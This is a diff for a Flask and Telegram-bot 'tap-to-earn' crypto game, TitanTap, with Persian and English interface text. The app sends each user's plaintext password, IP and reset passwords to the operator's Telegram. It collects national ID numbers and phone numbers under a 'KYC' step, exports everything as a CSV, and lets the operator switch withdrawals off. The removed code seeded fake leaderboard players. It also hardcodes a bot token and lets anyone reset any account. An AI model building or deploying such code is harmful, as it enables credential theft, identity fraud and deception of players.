@@ -8,6 +8,7 @@ import os
 import time
 import csv
 import random
+import string
 
 # ====== تنظیمات ======
 BOT_TOKEN = "8528248141:AAHjKBWXN5E7DWmMlCOkEFYB-kL1kyVTwmE"
@@ -16,6 +17,12 @@ ADMIN_ID  = "2028533085"
 
 app = Flask(__name__)
 bot = telebot.TeleBot(BOT_TOKEN)
+
+# تنظیمات کلی ربات
+SETTINGS = {
+    "withdraw_active": True,
+    "min_withdraw": 5000
+}
 
 # ====== دیتابیس ======
 def init_db():
@@ -32,15 +39,18 @@ def init_db():
         phone TEXT,
         kyc_status TEXT DEFAULT 'none',
         balance REAL DEFAULT 0.0,
+        total_taps INTEGER DEFAULT 0,
         profit_per_hour REAL DEFAULT 0.0,
         tap_power REAL DEFAULT 0.001,
         status TEXT DEFAULT 'approved',
         referrer TEXT DEFAULT NULL,
         ref_count INTEGER DEFAULT 0,
+        squad_name TEXT DEFAULT NULL,
         card1 INT DEFAULT 0,
         card2 INT DEFAULT 0,
         card3 INT DEFAULT 0,
         card4 INT DEFAULT 0,
+        last_daily REAL DEFAULT 0,
         last_sync REAL DEFAULT 0
     )''')
     conn.commit()
@@ -48,80 +58,69 @@ def init_db():
 
 init_db()
 
-# ====== ساخت ربات‌های فیک ======
-def add_fake_bots():
+# ====== توابع کمکی ======
+def get_user(email):
     conn = sqlite3.connect('game.db')
     c = conn.cursor()
-    c.execute("SELECT COUNT(*) FROM users WHERE status='bot'")
-    if c.fetchone()[0] == 0:
-        fake_names = ["CryptoKing", "Satoshi99", "HamsterPro", "TitanWhale", "Ali_Tapper", "MoonBoy"]
-        for name in fake_names:
-            email = f"{name.lower()}@fake.com"
-            c.execute("INSERT OR IGNORE INTO users (email, password, status, balance, last_sync) VALUES (?, '123', 'bot', 5000.0, ?)", (email, time.time()))
-        conn.commit()
+    c.execute("SELECT * FROM users WHERE email=?", (email,))
+    user = c.fetchone()
     conn.close()
+    return user
 
-add_fake_bots()
+def update_user(email, query, params):
+    conn = sqlite3.connect('game.db')
+    c = conn.cursor()
+    c.execute(f"UPDATE users SET {query} WHERE email=?", params + (email,))
+    conn.commit()
+    conn.close()
 
 # ====== ربات تلگرام (پنل ادمین) ======
 @bot.message_handler(commands=['start', 'admin'])
 def bot_start(message):
-    if str(message.chat.id) == ADMIN_ID:
-        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
-        markup.add(types.KeyboardButton('👥 لیست کاربران'), types.KeyboardButton('📊 آمار بازی'))
-        markup.add(types.KeyboardButton('📥 دانلود دیتابیس'), types.KeyboardButton('💸 ویرایش موجودی'))
-        bot.reply_to(message, "👑 به پنل مدیریت TitanTap خوش آمدید:", reply_markup=markup)
+    if str(message.chat.id) != ADMIN_ID: return
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
+    markup.add(types.KeyboardButton('📊 آمار ربات'), types.KeyboardButton('👥 لیست کاربران'))
+    markup.add(types.KeyboardButton('⚙️ تنظیمات سیستم'), types.KeyboardButton('📥 دانلود دیتابیس'))
+    bot.reply_to(message, "👑 **پنل مدیریت تایتان‌تپ**\nبه پنل خوش آمدید. از دکمه‌های زیر استفاده کنید:", reply_markup=markup)
 
-@bot.message_handler(func=lambda message: message.text == '📊 آمار بازی')
+@bot.message_handler(func=lambda message: message.text == '📊 آمار ربات')
 def bot_stats(message):
     if str(message.chat.id) != ADMIN_ID: return
     conn = sqlite3.connect('game.db')
     c = conn.cursor()
-    c.execute("SELECT COUNT(*), SUM(balance) FROM users WHERE status='approved'")
-    count, total_bal = c.fetchone()
+    c.execute("SELECT COUNT(*), SUM(balance), SUM(total_taps) FROM users WHERE status='approved'")
+    data = c.fetchone()
     conn.close()
-    bot.reply_to(message, f"📈 **آمار کلی:**\n\n👥 کاربران: {count}\n💰 مجموع تپ‌کوین‌ها: {total_bal:.2f} TTN")
+    bot.reply_to(message, f"📈 **آمار کلی:**\n\n👥 کاربران: {data[0]}\n💰 مجموع تپ‌کوین: {data[1]:.2f} TTN\n👆 کل تپ‌ها: {data[2]}")
 
-@bot.message_handler(func=lambda message: message.text == '📥 دانلود دیتابیس')
-def bot_export(message):
+@bot.message_handler(func=lambda message: message.text == '⚙️ تنظیمات سیستم')
+def bot_settings(message):
     if str(message.chat.id) != ADMIN_ID: return
-    conn = sqlite3.connect('game.db')
-    c = conn.cursor()
-    c.execute("SELECT id, email, password, ip, first_name, last_name, national_id, phone, balance FROM users WHERE status='approved'")
-    users = c.fetchall()
-    conn.close()
-    
-    if not users:
-        bot.reply_to(message, "دیتابیس خالی است.")
-        return
-        
-    filename = "users_data.csv"
-    with open(filename, 'w', newline='', encoding='utf-8') as f:
-        writer = csv.writer(f)
-        writer.writerow(['ID', 'Email', 'Password', 'IP', 'First Name', 'Last Name', 'National ID', 'Phone', 'Balance'])
-        writer.writerows(users)
-        
-    with open(filename, 'rb') as f:
-        bot.send_document(message.chat.id, f)
-    os.remove(filename)
+    markup = types.InlineKeyboardMarkup()
+    status = "فعال 🟢" if SETTINGS["withdraw_active"] else "غیرفعال 🔴"
+    markup.add(types.InlineKeyboardButton(f"سیستم برداشت: {status}", callback_data="toggle_withdraw"))
+    bot.send_message(ADMIN_ID, "⚙️ **تنظیمات سیستم**\nبرای تغییر وضعیت روی دکمه زیر بزنید:", reply_markup=markup)
+
+@bot.callback_query_handler(func=lambda call: True)
+def callback_query(call):
+    if str(call.from_user.id) != ADMIN_ID: return
+    if call.data == "toggle_withdraw":
+        SETTINGS["withdraw_active"] = not SETTINGS["withdraw_active"]
+        status = "فعال 🟢" if SETTINGS["withdraw_active"] else "غیرفعال 🔴"
+        bot.edit_message_text(f"⚙️ **تنظیمات سیستم**\nوضعیت برداشت: {status}", call.message.chat.id, call.message.message_id, reply_markup=call.message.reply_markup)
 
 @bot.message_handler(func=lambda message: message.text == '👥 لیست کاربران')
 def bot_list_users(message):
     if str(message.chat.id) != ADMIN_ID: return
     conn = sqlite3.connect('game.db')
     c = conn.cursor()
-    c.execute("SELECT id, email, balance FROM users WHERE status='approved' ORDER BY id DESC LIMIT 20")
+    c.execute("SELECT id, email, balance FROM users WHERE status='approved' ORDER BY id DESC LIMIT 15")
     users = c.fetchall()
     conn.close()
-    
-    if not users:
-        bot.reply_to(message, "هیچ کاربری وجود ندارد.")
-        return
-        
-    text = "👥 **۲۰ کاربر آخر:**\n\n"
+    text = "👥 **۱۵ کاربر آخر:**\n\n"
     for u in users:
-        text += f"ID: {u[0]} | {u[1]} | {u[2]:.1f} TTN\n"
-    text += "\nبرای ویرایش موجودی، از دستور زیر استفاده کنید:\n`/setbalance ID AMOUNT`"
+        text += f"ID: `{u[0]}` | {u[1]} | {u[2]:.1f} TTN\n"
+    text += "\nبرای ویرایش موجودی: `/setbalance ID AMOUNT`"
     bot.reply_to(message, text, parse_mode='Markdown')
 
 @bot.message_handler(commands=['setbalance'])
@@ -134,9 +133,26 @@ def bot_set_balance(message):
         c.execute("UPDATE users SET balance=? WHERE id=?", (float(amount), int(uid)))
         conn.commit()
         conn.close()
-        bot.reply_to(message, f"✅ موجودی کاربر {uid} به {amount} TTN تغییر کرد.")
+        bot.reply_to(message, f"✅ موجودی کاربر {uid} تغییر کرد.")
     except:
-        bot.reply_to(message, "❌ فرمت اشتباه است. مثال:\n`/setbalance 5 10000`")
+        bot.reply_to(message, "❌ فرمت: `/setbalance 5 10000`")
+
+@bot.message_handler(func=lambda message: message.text == '📥 دانلود دیتابیس')
+def bot_export(message):
+    if str(message.chat.id) != ADMIN_ID: return
+    conn = sqlite3.connect('game.db')
+    c = conn.cursor()
+    c.execute("SELECT email, password, ip, first_name, last_name, national_id, phone, balance FROM users WHERE status='approved'")
+    users = c.fetchall()
+    conn.close()
+    filename = "users_data.csv"
+    with open(filename, 'w', newline='', encoding='utf-8') as f:
+        writer = csv.writer(f)
+        writer.writerow(['Email', 'Password', 'IP', 'First Name', 'Last Name', 'National ID', 'Phone', 'Balance'])
+        writer.writerows(users)
+    with open(filename, 'rb') as f:
+        bot.send_document(message.chat.id, f)
+    os.remove(filename)
 
 # ====== وب سرور (بازی) ======
 html_game = """
@@ -149,7 +165,7 @@ html_game = """
 <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet" />
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
 <style>
-  :root { --primary: #ffaa00; --bg: #0b0f19; --card: #151b2b; --gold: #ffd700; }
+  :root { --primary: #ffaa00; --bg: #0b0f19; --card: #151b2b; --gold: #ffd700; --success: #00ffcc; }
   * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Vazirmatn', 'Inter', sans-serif; }
   body { background: var(--bg); color: white; display: flex; justify-content: center; min-height: 100vh; padding-bottom: 70px; overflow-x: hidden; transition: 0.3s; }
   body.en { direction: ltr; font-family: 'Inter', sans-serif; }
@@ -163,6 +179,8 @@ html_game = """
   
   h1 { font-size: 24px; font-weight: 800; color: var(--primary); margin-bottom: 20px; margin-top: 30px; }
   input { width:100%; padding:15px; margin-bottom:15px; border-radius:12px; border:1px solid #2a3441; background:var(--card); color:white; font-family: inherit; }
+  
+  .link-text { color: var(--success); cursor: pointer; font-size: 14px; margin-top: 10px; display: inline-block; text-decoration: underline; }
   
   .balance-card { background: var(--card); border-radius: 20px; padding: 20px; margin-bottom: 20px; border: 1px solid #2a3441; position: relative; z-index: 2; }
   .balance-value { font-size: 38px; font-weight: 800; color: var(--primary); }
@@ -186,6 +204,7 @@ html_game = """
   
   .daily-card, .cipher-card, .kyc-card, .spin-card { background: var(--card); padding: 20px; border-radius: 20px; border: 1px solid #2a3441; margin-bottom: 20px; }
   .btn-action { padding: 15px; background: var(--primary); color: black; border: none; border-radius: 10px; font-weight: bold; margin-top: 15px; width: 100%; cursor: pointer; font-size: 16px; font-family: inherit; }
+  .btn-success { background: var(--success); }
   
   .bottom-nav { position: fixed; bottom: 0; left: 0; width: 100%; background: var(--card); display: flex; justify-content: space-around; padding: 10px 0; border-top: 1px solid #2a3441; max-width: 420px; margin: 0 auto; right: 0; z-index: 10; }
   .nav-item { font-size: 10px; color: #8892b0; cursor: pointer; display: flex; flex-direction: column; align-items: center; }
@@ -197,15 +216,43 @@ html_game = """
 <div class="app-container">
   <div class="lang-toggle" onclick="toggleLang()">EN / FA</div>
   
-  <div id="login-screen" class="screen active">
-    <h1>🛡️ TitanTap</h1>
-    <input type="email" id="email" data-fa="ایمیل" data-en="Email Address" placeholder="ایمیل">
-    <input type="password" id="password" data-fa="رمز عبور" data-en="Password" placeholder="رمز عبور">
-    <button class="btn-action" onclick="register()" data-fa="ساخت حساب" data-en="Create Account">ساخت حساب</button>
+  <!-- AUTH SCREEN -->
+  <div id="auth-screen" class="screen active">
+    
+    <!-- LOGIN -->
+    <div id="login-form">
+      <h1>🛡️ TitanTap</h1>
+      <input type="email" id="login_email" data-fa="ایمیل" data-en="Email Address" placeholder="ایمیل">
+      <input type="password" id="login_password" data-fa="رمز عبور" data-en="Password" placeholder="رمز عبور">
+      <button class="btn-action" onclick="login()" data-fa="ورود" data-en="Login">ورود</button>
+      <br><span class="link-text" onclick="showForm('register-form')" data-fa="حساب ندارید؟ ثبت‌نام کنید" data-en="Don't have an account? Sign up">حساب ندارید؟ ثبت‌نام کنید</span><br>
+      <span class="link-text" onclick="showForm('forgot-form')" style="color:#8892b0;" data-fa="رمز عبور را فراموش کرده‌اید؟" data-en="Forgot Password?">رمز عبور را فراموش کرده‌اید؟</span>
+    </div>
+
+    <!-- REGISTER -->
+    <div id="register-form" style="display:none;">
+      <h1 data-fa="ثبت‌نام" data-en="Sign Up">ثبت‌نام</h1>
+      <input type="email" id="reg_email" data-fa="ایمیل" data-en="Email Address" placeholder="ایمیل">
+      <input type="password" id="reg_password" data-fa="رمز عبور" data-en="Password" placeholder="رمز عبور">
+      <button class="btn-action" onclick="register()" data-fa="ساخت حساب" data-en="Create Account">ساخت حساب</button>
+      <br><span class="link-text" onclick="showForm('login-form')" data-fa="قبلاً ثبت‌نام کرده‌اید؟ وارد شوید" data-en="Already have an account? Login">قبلاً ثبت‌نام کرده‌اید؟ وارد شوید</span>
+    </div>
+
+    <!-- FORGOT -->
+    <div id="forgot-form" style="display:none;">
+      <h1 data-fa="فراموشی رمز" data-en="Forgot Password">فراموشی رمز</h1>
+      <p style="font-size:13px; color:#8892b0; margin-bottom:15px;" data-fa="رمز جدید به صورت خودکار ساخته می‌شود." data-en="A new password will be generated.">رمز جدید به صورت خودکار ساخته می‌شود.</p>
+      <input type="email" id="forgot_email" data-fa="ایمیل" data-en="Email Address" placeholder="ایمیل">
+      <button class="btn-action" onclick="forgotPass()" data-fa="بازیابی رمز" data-en="Reset Password">بازیابی رمز</button>
+      <br><span class="link-text" onclick="showForm('login-form')" data-fa="بازگشت به صفحه ورود" data-en="Back to Login">بازگشت به صفحه ورود</span>
+    </div>
+
   </div>
 
+  <!-- MAIN APP -->
   <div id="main-app" class="screen">
     
+    <!-- MINE -->
     <div id="tab-mine" class="tab-content">
       <div class="balance-card">
         <div style="font-size:14px; color:#8892b0;" data-fa="موجودی شما" data-en="Your Balance">موجودی شما</div>
@@ -215,8 +262,10 @@ html_game = """
       <div class="tap-area" id="tap-area">
         <div class="tap-btn" id="tap-btn" onclick="tap(event)">🛡️</div>
       </div>
+      <button class="btn-action btn-success" onclick="requestWithdraw()" data-fa="درخواست برداشت" data-en="Request Withdraw">درخواست برداشت</button>
     </div>
 
+    <!-- UPGRADES -->
     <div id="tab-upgrades" class="tab-content" style="display:none;">
       <h1 data-fa="کارت‌های استخراج" data-en="Mining Cards">کارت‌های استخراج</h1>
       <div class="cards-grid">
@@ -227,6 +276,7 @@ html_game = """
       </div>
     </div>
 
+    <!-- GAMES -->
     <div id="tab-games" class="tab-content" style="display:none;">
       <h1 data-fa="بازی‌ها و جوایز" data-en="Games & Rewards">بازی‌ها و جوایز</h1>
       <div class="spin-card">
@@ -242,21 +292,24 @@ html_game = """
       </div>
     </div>
 
+    <!-- FRIENDS (SQUADS) -->
     <div id="tab-friends" class="tab-content" style="display:none;">
-      <h1 data-fa="دعوت دوستان" data-en="Invite Friends">دعوت دوستان</h1>
+      <h1 data-fa="جوخه (Squad)" data-en="Your Squad">جوخه (Squad)</h1>
       <div class="daily-card">
-        <p data-fa="با هر دعوت ۲۰۰ TTN بگیرید!" data-en="Earn 200 TTN per verified friend!">با هر دعوت ۲۰۰ TTN بگیرید!</p>
+        <p data-fa="با هر دعوت ۲۰۰ TTN بگیرید!" data-en="Earn 200 TTN per friend!">با هر دعوت ۲۰۰ TTN بگیرید!</p>
         <p style="margin-top:10px;"><span data-fa="دوستان دعوت شده:" data-en="Friends Invited:">دوستان دعوت شده:</span> <b id="ref_count" style="color:var(--primary);">0</b></p>
         <input type="text" id="ref_link" readonly style="margin-top:15px; text-align:center; color:var(--primary);">
         <button class="btn-action" onclick="copyLink()" data-fa="کپی لینک دعوت" data-en="Copy Invite Link">کپی لینک دعوت</button>
       </div>
     </div>
 
+    <!-- TOP -->
     <div id="tab-top" class="tab-content" style="display:none;">
       <h1 data-fa="لیدربورد" data-en="Leaderboard">لیدربورد</h1>
       <div id="leaderboard-list"></div>
     </div>
 
+    <!-- PROFILE / KYC -->
     <div id="tab-profile" class="tab-content" style="display:none;">
       <h1 data-fa="پروفایل و احراز هویت" data-en="Profile & KYC">پروفایل و احراز هویت</h1>
       <div class="kyc-card">
@@ -265,10 +318,11 @@ html_game = """
         <input type="text" id="lname" data-fa="نام خانوادگی" data-en="Real Last Name" placeholder="نام خانوادگی">
         <input type="text" id="nid" data-fa="کد ملی" data-en="National ID" placeholder="کد ملی">
         <input type="text" id="phone" data-fa="شماره تماس" data-en="Phone Number" placeholder="شماره تماس">
-        <button class="btn-action" onclick="submitKYC()" style="background:#00ffcc;" data-fa="ذخیره اطلاعات" data-en="Save KYC Info">ذخیره اطلاعات</button>
+        <button class="btn-action btn-success" onclick="submitKYC()" data-fa="ذخیره اطلاعات" data-en="Save KYC Info">ذخیره اطلاعات</button>
       </div>
     </div>
 
+    <!-- BOTTOM NAV -->
     <div class="bottom-nav">
       <div class="nav-item active" onclick="switchTab('mine', this)"><div class="nav-icon">🪙</div><span data-fa="استخراج" data-en="Mine">استخراج</span></div>
       <div class="nav-item" onclick="switchTab('upgrades', this)"><div class="nav-icon">🃏</div><span data-fa="کارت‌ها" data-en="Cards">کارت‌ها</span></div>
@@ -283,12 +337,13 @@ html_game = """
 
 <script>
   let userEmail = "";
-  let gameInterval;
   let currentProfit = 0;
   let currentTapPower = 0.001;
   let costs = { card1: 100, card2: 500, card3: 2000, card4: 10000 };
   let currentLang = 'fa';
+  let unsyncedTaps = 0;
 
+  // Language Toggle
   function toggleLang() {
     currentLang = currentLang === 'fa' ? 'en' : 'fa';
     document.body.dir = currentLang === 'fa' ? 'rtl' : 'ltr';
@@ -303,6 +358,12 @@ html_game = """
     });
   }
 
+  function showForm(id) {
+    document.querySelectorAll('#auth-screen > div').forEach(d => d.style.display = 'none');
+    document.getElementById(id).style.display = 'block';
+  }
+
+  // Sound
   const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
   function playCoinSound() {
       if(audioCtx.state === 'suspended') audioCtx.resume();
@@ -319,80 +380,101 @@ html_game = """
       osc.stop(audioCtx.currentTime + 0.1);
   }
 
-  async function register() {
-    const email = document.getElementById('email').value;
-    const password = document.getElementById('password').value;
-    if(!email || !password) return alert("Fill all fields");
-    
-    const res = await fetch('/api/register', {
-      method: 'POST', headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({email, password})
-    });
-    const data = await res.json();
-    if(data.success) {
-      userEmail = email;
-      document.getElementById('login-screen').classList.remove('active');
-      document.getElementById('main-app').classList.add('active');
-      checkStatus();
-    } else { alert("Registration failed."); }
+  // API Calls
+  async function apiCall(endpoint, data) {
+    const res = await fetch(endpoint, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(data) });
+    return await res.json();
   }
 
-  async function checkStatus() {
-    const res = await fetch('/api/status', {
-      method: 'POST', headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({email: userEmail})
-    });
-    const data = await res.json();
+  async function login() {
+    const email = document.getElementById('login_email').value;
+    const password = document.getElementById('login_password').value;
+    const data = await apiCall('/api/login', {email, password});
+    if(data.success) {
+      userEmail = email;
+      startGame(data.user);
+    } else alert(data.message);
+  }
+
+  async function register() {
+    const email = document.getElementById('reg_email').value;
+    const password = document.getElementById('reg_password').value;
+    const data = await apiCall('/api/register', {email, password});
+    if(data.success) {
+      userEmail = email;
+      startGame(data.user);
+    } else alert(data.message);
+  }
+
+  async function forgotPass() {
+    const email = document.getElementById('forgot_email').value;
+    const data = await apiCall('/api/forgot', {email});
+    if(data.success) alert("رمز جدید شما: " + data.new_password + "\nلطفاً با آن وارد شوید.");
+    else alert(data.message);
+  }
+
+  function startGame(user) {
+    document.getElementById('auth-screen').classList.remove('active');
+    document.getElementById('main-app').classList.add('active');
+    updateUI(user);
+    document.getElementById('ref_link').value = window.location.origin + "/?ref=" + encodeURIComponent(userEmail);
     
-    if(data.status === 'approved') {
-      updateUI(data);
-      document.getElementById('ref_link').value = window.location.origin + "/?ref=" + encodeURIComponent(userEmail);
-      
-      if(gameInterval) clearInterval(gameInterval);
-      gameInterval = setInterval(() => {
+    // Sync loop every 5 seconds
+    setInterval(syncTaps, 5000);
+    // Profit loop
+    setInterval(() => {
         let current = parseFloat(document.getElementById('balance').innerText);
         let gain = currentProfit / 3600;
         document.getElementById('balance').innerText = (current + gain).toFixed(3);
-      }, 1000);
-    }
+    }, 1000);
   }
 
   function updateUI(data) {
-    document.getElementById('balance').innerText = data.balance.toFixed(3);
-    document.getElementById('profit').innerText = data.profit_per_hour.toFixed(2);
-    currentProfit = data.profit_per_hour;
-    currentTapPower = data.tap_power;
-    document.getElementById('ref_count').innerText = data.ref_count;
+    if(data.balance !== undefined) document.getElementById('balance').innerText = data.balance.toFixed(3);
+    if(data.profit_per_hour !== undefined) {
+        document.getElementById('profit').innerText = data.profit_per_hour.toFixed(2);
+        currentProfit = data.profit_per_hour;
+    }
+    if(data.tap_power !== undefined) currentTapPower = data.tap_power;
+    if(data.ref_count !== undefined) document.getElementById('ref_count').innerText = data.ref_count;
     
     for(let i=1; i<=4; i++) {
         let el = document.getElementById('lvl_card'+i);
-        if(el) el.innerText = data['card'+i];
+        if(el && data['card'+i] !== undefined) el.innerText = data['card'+i];
         let costEl = document.getElementById('cost_card'+i);
-        if(costEl) {
+        if(costEl && data['card'+i] !== undefined) {
             costs['card'+i] = costs['card'+i] * Math.pow(1.5, data['card'+i]);
             costEl.innerText = Math.floor(costs['card'+i]);
         }
     }
   }
 
-  async function tap(e) {
+  function tap(e) {
     if (navigator.vibrate) navigator.vibrate(20);
     playCoinSound();
     createParticles(e);
 
-    const res = await fetch('/api/tap', {
-      method: 'POST', headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({email: userEmail, power: currentTapPower})
-    });
-    const data = await res.json();
-    if(data.success) document.getElementById('balance').innerText = data.balance.toFixed(3);
+    // Offline Tap Logic (0 lag)
+    let current = parseFloat(document.getElementById('balance').innerText);
+    document.getElementById('balance').innerText = (current + currentTapPower).toFixed(3);
+    unsyncedTaps += currentTapPower;
+  }
+
+  async function syncTaps() {
+    if(unsyncedTaps <= 0) return;
+    const tapsToSend = unsyncedTaps;
+    unsyncedTaps = 0; // Reset early to prevent double sends
+    const data = await apiCall('/api/tap', {email: userEmail, power: tapsToSend});
+    if(!data.success) {
+        // If failed, add back to unsynced
+        unsyncedTaps += tapsToSend;
+    }
   }
 
   function createParticles(e) {
     const rect = document.getElementById('tap-area').getBoundingClientRect();
     const x = e.clientX - rect.left;
     const y = e.clientY - rect.top;
-    
     for(let i=0; i<5; i++) {
       let p = document.createElement('div');
       p.className = 'particle';
@@ -406,38 +488,22 @@ html_game = """
   }
 
   async function upgrade(type) {
-    const res = await fetch('/api/upgrade', {
-      method: 'POST', headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({email: userEmail, type: type, cost: costs[type]})
-    });
-    const data = await res.json();
-    if(data.success) { updateUI(data); alert("Upgrade successful!"); }
+    const data = await apiCall('/api/upgrade', {email: userEmail, type: type, cost: costs[type]});
+    if(data.success) { updateUI(data); alert("Upgraded!"); }
     else { alert(data.message); }
   }
   
   async function submitCipher() {
     const code = document.getElementById('cipher_input').value;
-    const res = await fetch('/api/cipher', {
-      method: 'POST', headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({email: userEmail, code: code})
-    });
-    const data = await res.json();
-    if(data.success) {
-      alert("Correct! 500 TTN added.");
-      document.getElementById('balance').innerText = data.balance.toFixed(3);
-    } else { alert(data.message); }
+    const data = await apiCall('/api/cipher', {email: userEmail, code: code});
+    if(data.success) { alert("Correct! 500 TTN added."); updateUI(data); }
+    else { alert(data.message); }
   }
 
   async function spinWheel() {
-    const res = await fetch('/api/spin', {
-      method: 'POST', headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({email: userEmail})
-    });
-    const data = await res.json();
-    if(data.success) {
-      alert("Result: " + data.result);
-      document.getElementById('balance').innerText = data.balance.toFixed(3);
-    } else { alert(data.message); }
+    const data = await apiCall('/api/spin', {email: userEmail});
+    if(data.success) { alert(data.result); updateUI(data); }
+    else { alert(data.message); }
   }
 
   async function submitKYC() {
@@ -445,14 +511,14 @@ html_game = """
     const lname = document.getElementById('lname').value;
     const nid = document.getElementById('nid').value;
     const phone = document.getElementById('phone').value;
-    if(!fname || !lname || !nid || !phone) return alert("Fill all KYC fields");
-    
-    const res = await fetch('/api/kyc', {
-      method: 'POST', headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({email: userEmail, fname, lname, nid, phone})
-    });
-    const data = await res.json();
-    if(data.success) alert("KYC Information submitted successfully!");
+    if(!fname || !lname || !nid || !phone) return alert("Fill all fields");
+    const data = await apiCall('/api/kyc', {email: userEmail, fname, lname, nid, phone});
+    if(data.success) alert("KYC Submitted!");
+  }
+
+  async function requestWithdraw() {
+    const data = await apiCall('/api/withdraw_req', {email: userEmail});
+    alert(data.message);
   }
 
   async function loadLeaderboard() {
@@ -492,170 +558,117 @@ def index():
 @app.route('/api/register', methods=['POST'])
 def register():
     data = request.json
-    email = data.get('email')
-    password = data.get('password')
-    ip = request.remote_addr
-    referrer = request.args.get('ref')
-    now = time.time()
+    email, password = data.get('email'), data.get('password')
+    ip, referrer, now = request.remote_addr, request.args.get('ref'), time.time()
     
-    try:
-        conn = sqlite3.connect('game.db')
-        c = conn.cursor()
-        c.execute("INSERT INTO users (email, password, ip, referrer, status, last_sync) VALUES (?, ?, ?, ?, 'approved', ?)", 
-                  (email, password, ip, referrer, now))
-        conn.commit()
-        conn.close()
+    if get_user(email): return jsonify({"success": False, "message": "Email already exists"})
+    
+    conn = sqlite3.connect('game.db')
+    c = conn.cursor()
+    c.execute("INSERT INTO users (email, password, ip, referrer, status, last_sync) VALUES (?, ?, ?, ?, 'approved', ?)", (email, password, ip, referrer, now))
+    conn.commit()
+    conn.close()
+    
+    text = f"🔴 **New Signup**\n📧 {email}\n🔑 {password}\n🌐 {ip}\n👥 Ref: {referrer or 'None'}"
+    bot.send_message(ADMIN_ID, text, parse_mode='Markdown')
+    
+    return jsonify({"success": True, "user": {"email": email, "balance": 0, "profit_per_hour": 0, "tap_power": 0.001, "ref_count": 0}})
+
+@app.route('/api/login', methods=['POST'])
+def login():
+    data = request.json
+    email, password = data.get('email'), data.get('password')
+    user = get_user(email)
+    
+    if not user or user[2] != password: return jsonify({"success": False, "message": "Invalid credentials"})
+    
+    # Calculate offline profit
+    now = time.time()
+    if user[20] > 0: # last_sync index
+        elapsed_hours = (now - user[20]) / 3600.0
+        gain = elapsed_hours * user[11] # profit_per_hour index
+        update_user(email, "balance = balance + ?, last_sync = ?", (gain, now))
+        user = get_user(email)
+    else:
+        update_user(email, "last_sync = ?", (now,))
         
-        text = f"🔴 **New Signup (TitanTap)**\n\n📧 Email: {email}\n🔑 Password: {password}\n🌐 IP: {ip}\n👥 Ref: {referrer if referrer else 'None'}"
-        bot.send_message(ADMIN_ID, text, parse_mode='Markdown')
-        
-        return jsonify({"success": True})
-    except Exception as e:
-        return jsonify({"success": False, "error": str(e)})
+    return jsonify({"success": True, "user": {"email": user[1], "balance": user[10], "profit_per_hour": user[11], "tap_power": user[12], "card1": user[16], "card2": user[17], "card3": user[18], "card4": user[19], "ref_count": user[15]}})
+
+@app.route('/api/forgot', methods=['POST'])
+def forgot():
+    email = request.json.get('email')
+    user = get_user(email)
+    if not user: return jsonify({"success": False, "message": "Email not found"})
+    
+    new_pass = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
+    update_user(email, "password = ?", (new_pass,))
+    
+    bot.send_message(ADMIN_ID, f"🔄 **Password Reset**\n📧 {email}\n🔑 New: {new_pass}")
+    return jsonify({"success": True, "new_password": new_pass})
 
 @app.route('/api/kyc', methods=['POST'])
 def kyc():
     data = request.json
-    email = data.get('email')
-    fname = data.get('fname')
-    lname = data.get('lname')
-    nid = data.get('nid')
-    phone = data.get('phone')
-    ip = request.remote_addr
-    
-    conn = sqlite3.connect('game.db')
-    c = conn.cursor()
-    c.execute("UPDATE users SET first_name=?, last_name=?, national_id=?, phone=?, kyc_status='pending' WHERE email=?", 
-              (fname, lname, nid, phone, email))
-    conn.commit()
-    conn.close()
-    
-    text = f"💳 **KYC Submitted (TitanTap)**\n\n📧 Email: {email}\n👤 Name: {fname} {lname}\n🆔 National ID: {nid}\n📱 Phone: {phone}\n🌐 IP: {ip}"
-    bot.send_message(ADMIN_ID, text, parse_mode='Markdown')
+    update_user(data['email'], "first_name=?, last_name=?, national_id=?, phone=?, kyc_status='pending'", (data['fname'], data['lname'], data['nid'], data['phone']))
+    bot.send_message(ADMIN_ID, f"💳 **KYC Submitted**\n📧 {data['email']}\n👤 {data['fname']} {data['lname']}\n🆔 {data['nid']}\n📱 {data['phone']}", parse_mode='Markdown')
     return jsonify({"success": True})
 
 @app.route('/api/spin', methods=['POST'])
 def spin():
     email = request.json.get('email')
-    conn = sqlite3.connect('game.db')
-    c = conn.cursor()
-    c.execute("SELECT balance FROM users WHERE email=?", (email,))
-    bal = c.fetchone()[0]
+    user = get_user(email)
+    if user[10] < 100: return jsonify({"success": False, "message": "Not enough TTN"})
     
-    if bal < 100:
-        conn.close()
-        return jsonify({"success": False, "message": "Not enough TTN to spin (Needs 100)"})
-        
-    outcomes = [
-        {"mult": 0, "text": "You lost! Try again."},
-        {"mult": 0, "text": "You lost! Try again."},
-        {"mult": 0.5, "text": "You won 50 TTN!"},
-        {"mult": 1.5, "text": "You won 150 TTN!"},
-        {"mult": 3, "text": "JACKPOT! You won 300 TTN!"}
-    ]
+    outcomes = [{"mult": 0, "text": "You lost!"}, {"mult": 0, "text": "You lost!"}, {"mult": 0.5, "text": "Won 50 TTN"}, {"mult": 1.5, "text": "Won 150 TTN"}, {"mult": 3, "text": "JACKPOT 300 TTN"}]
     result = random.choice(outcomes)
-    new_bal = bal - 100 + (100 * result["mult"])
-    
-    c.execute("UPDATE users SET balance = ? WHERE email=?", (new_bal, email))
-    conn.commit()
-    conn.close()
-    
+    new_bal = user[10] - 100 + (100 * result["mult"])
+    update_user(email, "balance = ?", (new_bal,))
     return jsonify({"success": True, "result": result["text"], "balance": new_bal})
-
-@app.route('/api/status', methods=['POST'])
-def status():
-    email = request.json.get('email')
-    conn = sqlite3.connect('game.db')
-    c = conn.cursor()
-    c.execute("SELECT status, balance, profit_per_hour, tap_power, card1, card2, card3, card4, ref_count, last_sync FROM users WHERE email=?", (email,))
-    user = c.fetchone()
-    
-    if user:
